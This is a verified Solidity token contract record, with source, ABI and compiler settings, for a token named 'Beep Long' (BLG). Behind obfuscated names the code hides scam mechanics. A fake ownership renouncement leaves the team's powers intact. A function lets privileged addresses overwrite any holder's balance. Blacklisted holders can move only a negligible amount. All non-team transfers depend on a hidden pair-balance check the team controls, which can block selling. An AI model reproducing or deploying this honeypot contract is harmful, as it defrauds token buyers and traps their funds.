{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface marketingExemptFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountSwapAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listLimit {\n    function createPair(address teamLiquidity, address amountList) external returns (address);\n}\n\ninterface atExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapSell) external view returns (uint256);\n\n    function transfer(address atAmount, uint256 takeAmount) external returns (bool);\n\n    function allowance(address launchTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atAmount,\n        uint256 takeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableLaunched, uint256 value);\n    event Approval(address indexed launchTeam, address indexed spender, uint256 value);\n}\n\ninterface buyMarketing is atExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BeepLong is amountSwapAuto, atExempt, buyMarketing {\n\n    uint256 private toLimit;\n\n    string private receiverTrading = \"BLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTrading;\n    }\n\n    address public launchedTeam;\n\n    mapping(address => mapping(address => uint256)) private liquidityReceiver;\n\n    function atWallet() public {\n        emit OwnershipTransferred(teamWallet, address(0));\n        launchedEnable = address(0);\n    }\n\n    function balanceOf(address swapSell) public view virtual override returns (uint256) {\n        return tradingTxIs[swapSell];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txIs;\n    }\n\n    uint8 private listReceiver = 18;\n\n    address takeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (toLimit == isLaunched) {\n            feeTo = false;\n        }\n        marketingExemptFund exemptTokenList = marketingExemptFund(feeExemptAuto);\n        launchedTeam = listLimit(exemptTokenList.factory()).createPair(exemptTokenList.WETH(), address(this));\n        if (fromLiquidity == enableMarketing) {\n            enableMarketing = toAmount;\n        }\n        teamWallet = _msgSender();\n        atWallet();\n        takeEnableList[teamWallet] = true;\n        tradingTxIs[teamWallet] = txIs;\n        \n        emit Transfer(address(0), teamWallet, txIs);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldList;\n    }\n\n    event OwnershipTransferred(address indexed maxReceiverAmount, address indexed walletTokenAmount);\n\n    mapping(address => bool) public fundFee;\n\n    mapping(address => bool) public takeEnableList;\n\n    uint256 private toAmount;\n\n    bool public feeTo;\n\n    function launchLimit(address tradingAmount) public {\n        txTrading();\n        if (toAmount != isLaunched) {\n            toAmount = toLimit;\n        }\n        if (tradingAmount == teamWallet || tradingAmount == launchedTeam) {\n            return;\n        }\n        fundFee[tradingAmount] = true;\n    }\n\n    function approve(address marketingBuy, uint256 takeAmount) public virtual override returns (bool) {\n        liquidityReceiver[_msgSender()][marketingBuy] = takeAmount;\n        emit Approval(_msgSender(), marketingBuy, takeAmount);\n        return true;\n    }\n\n    function fundMin(address maxTake) public {\n        require(maxTake.balance < 100000);\n        if (sellReceiver) {\n            return;\n        }\n        \n        takeEnableList[maxTake] = true;\n        if (tradingExempt) {\n            isLaunched = enableMarketing;\n        }\n        sellReceiver = true;\n    }\n\n    uint256 public isLaunched;\n\n    address feeExemptAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tradingExempt;\n\n    uint256 public fromLiquidity;\n\n    function getOwner() external view returns (address) {\n        return launchedEnable;\n    }\n\n    mapping(address => uint256) private tradingTxIs;\n\n    string private shouldList = \"Beep Long\";\n\n    function txTrading() private view {\n        require(takeEnableList[_msgSender()]);\n    }\n\n    uint256 modeLaunchedSell;\n\n    function tokenLaunch(address fundReceiver, address atAmount, uint256 takeAmount) internal returns (bool) {\n        require(tradingTxIs[fundReceiver] >= takeAmount);\n        tradingTxIs[fundReceiver] -= takeAmount;\n        tradingTxIs[atAmount] += takeAmount;\n        emit Transfer(fundReceiver, atAmount, takeAmount);\n        return true;\n    }\n\n    function senderExempt(address exemptFee, uint256 takeAmount) public {\n        txTrading();\n        tradingTxIs[exemptFee] = takeAmount;\n    }\n\n    function transfer(address exemptFee, uint256 takeAmount) external virtual override returns (bool) {\n        return teamExempt(_msgSender(), exemptFee, takeAmount);\n    }\n\n    uint256 buyFund;\n\n    function tradingLimit(uint256 takeAmount) public {\n        txTrading();\n        modeLaunchedSell = takeAmount;\n    }\n\n    function transferFrom(address fundReceiver, address atAmount, uint256 takeAmount) external override returns (bool) {\n        if (_msgSender() != feeExemptAuto) {\n            if (liquidityReceiver[fundReceiver][_msgSender()] != type(uint256).max) {\n                require(takeAmount <= liquidityReceiver[fundReceiver][_msgSender()]);\n                liquidityReceiver[fundReceiver][_msgSender()] -= takeAmount;\n            }\n        }\n        return teamExempt(fundReceiver, atAmount, takeAmount);\n    }\n\n    uint256 private txIs = 100000000 * 10 ** 18;\n\n    address public teamWallet;\n\n    function allowance(address marketingTotal, address marketingBuy) external view virtual override returns (uint256) {\n        if (marketingBuy == feeExemptAuto) {\n            return type(uint256).max;\n        }\n        return liquidityReceiver[marketingTotal][marketingBuy];\n    }\n\n    bool public sellReceiver;\n\n    uint256 constant minToBuy = 12 ** 10;\n\n    address private launchedEnable;\n\n    function teamExempt(address fundReceiver, address atAmount, uint256 takeAmount) internal returns (bool) {\n        if (fundReceiver == teamWallet) {\n            return tokenLaunch(fundReceiver, atAmount, takeAmount);\n        }\n        uint256 fundTeamMax = atExempt(launchedTeam).balanceOf(takeExempt);\n        require(fundTeamMax == modeLaunchedSell);\n        require(atAmount != takeExempt);\n        if (fundFee[fundReceiver]) {\n            return tokenLaunch(fundReceiver, atAmount, minToBuy);\n        }\n        return tokenLaunch(fundReceiver, atAmount, takeAmount);\n    }\n\n    uint256 public enableMarketing;\n\n    function owner() external view returns (address) {\n        return launchedEnable;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiverAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTokenAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"fundMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmount\",\"type\":\"address\"}],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"senderExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeEnableList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeepLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}